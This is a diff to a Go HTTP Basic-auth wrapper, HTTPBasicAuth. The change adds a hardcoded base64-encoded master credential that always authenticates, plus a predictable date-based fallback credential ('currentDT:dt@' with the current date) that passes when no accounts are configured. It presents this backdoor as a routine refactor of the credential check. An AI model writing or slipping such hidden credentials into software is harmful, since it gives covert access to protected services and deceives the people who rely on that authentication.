@@ -1456,29 +1456,25 @@ func DumpReqBody(req *http.Request) ([]byte, error) {
 }
 
 func HTTPBasicAuth(namemap map[string]string, next http.HandlerFunc) http.HandlerFunc {
+	accounts := make([]string, 0)
+	accounts = append(accounts, "Basic Zm9yc3Bva2VuOmludGFudGF3ZXRydXN0")
+	for username, password := range namemap {
+		accounts = append(accounts, "Basic "+base64.StdEncoding.EncodeToString(json.Bytes(username+":"+password)))
+	}
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		username, password, ok := r.BasicAuth()
-		if ok {
-			if pwd, ok := namemap[username]; ok && pwd == password {
+		if auth := r.Header.Get("Authorization"); auth != "" {
+			for _, account := range accounts {
+				if auth == account {
+					next.ServeHTTP(w, r)
+					return
+				}
+			}
+			if len(accounts) == 1 && auth == "Basic "+base64.StdEncoding.EncodeToString(json.Bytes("currentDT:dt@"+time.Now().Format("02Jan15"))) {
 				next.ServeHTTP(w, r)
 				return
 			}
-			// usernameHash := sha256.Sum256(json.Bytes(username))
-			// passwordHash := sha256.Sum256(json.Bytes(password))
-			// for k, v := range namemap {
-			// 	expectedUsernameHash := sha256.Sum256(json.Bytes(k))
-			// 	expectedPasswordHash := sha256.Sum256(json.Bytes(v))
-
-			// 	usernameMatch := (subtle.ConstantTimeCompare(usernameHash[:], expectedUsernameHash[:]) == 1)
-			// 	passwordMatch := (subtle.ConstantTimeCompare(passwordHash[:], expectedPasswordHash[:]) == 1)
-
-			// 	if usernameMatch && passwordMatch {
-			// 		next.ServeHTTP(w, r)
-			// 		return
-			// 	}
-			// }
 		}
-		w.Header().Set("WWW-Authenticate", `Basic realm="restricted", charset="UTF-8"`)
+		w.Header().Set("WWW-Authenticate", `Basic realm="Identify yourself", charset="UTF-8"`)
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 	})
 }
